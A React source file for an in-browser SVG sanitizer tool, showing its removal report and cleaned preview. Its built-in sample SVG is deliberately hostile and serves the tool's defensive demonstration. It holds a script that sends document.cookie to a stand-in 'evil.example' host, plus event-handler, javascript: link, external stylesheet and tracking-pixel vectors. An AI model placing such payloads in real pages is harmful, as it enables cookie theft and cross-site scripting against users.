"use client";

import { Alert, Panel, ResultSlab, TransformTool } from "@toolwright/ui";
import { describeRemoved, reportLines } from "@toolwright/core/svg-report";
import { sanitizeSvg } from "../../shared/svg-sanitize";
import { SvgPreview } from "../../shared/svg-preview";

const SAMPLE = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" onload="alert('hi')">
  <script>fetch("https://evil.example/steal?c=" + document.cookie)</script>
  <style>@import url("https://evil.example/x.css"); .dot { fill: #1d6b57 }</style>
  <a href="javascript:alert(1)"><circle class="dot" cx="50" cy="50" r="30" onclick="alert(2)"/></a>
  <foreignObject width="100" height="100"><div xmlns="http://www.w3.org/1999/xhtml">injected</div></foreignObject>
  <image href="https://tracker.example/pixel.png" width="1" height="1"/>
</svg>
`;

function Report({ input, output }: { input: string; output: string }) {
  if (!input.trim() || !output.trim()) return null;
  let lines: string[] = [];
  let total = 0;
  try {
    const report = describeRemoved(input, output);
    lines = reportLines(report);
    total = report.total;
  } catch {
    return null;
  }
  return (
    <div className="flex flex-col gap-4">
      <ResultSlab label="Removed" size="md" value={total === 0 ? "Nothing" : String(total)} note={total === 0 ? "This file had nothing unsafe in it." : "Elements and attributes that could run code or reach outside the file."} valueTestId="sanitize-count" />
      {lines.length > 0 ? (
        <ul aria-label="What was removed" className="list-disc pl-5 text-sm">
          {lines.map((line) => (
            <li key={line}>{line}</li>
          ))}
        </ul>
      ) : null}
      <Panel title="Cleaned picture">
        <SvgPreview svg={output} label="The cleaned SVG" />
      </Panel>
    </div>
  );
}

export default function Tool() {
  return (
    <div className="flex flex-col gap-5">
      <Alert tone="info" title="How it works">
        Scripts, event handlers, embedded pages, links to other sites and external styles are removed. Ordinary drawing content is kept. The file is cleaned in this tab and never uploaded.
      </Alert>
      <TransformTool
        transform={(input) => sanitizeSvg(input)}
        inputLabel="SVG to clean"
        outputLabel="Cleaned SVG"
        inputPlaceholder="Paste an SVG here, or drop a file"
        sample={SAMPLE}
        acceptFile=".svg,image/svg+xml"
        outputFilename="clean.svg"
        outputMime="image/svg+xml"
        rows={14}
        shareable={false}
        inputMono
        outputMono
        renderExtra={({ input, output }) => <Report input={input} output={output} />}
      />
    </div>
  );
}
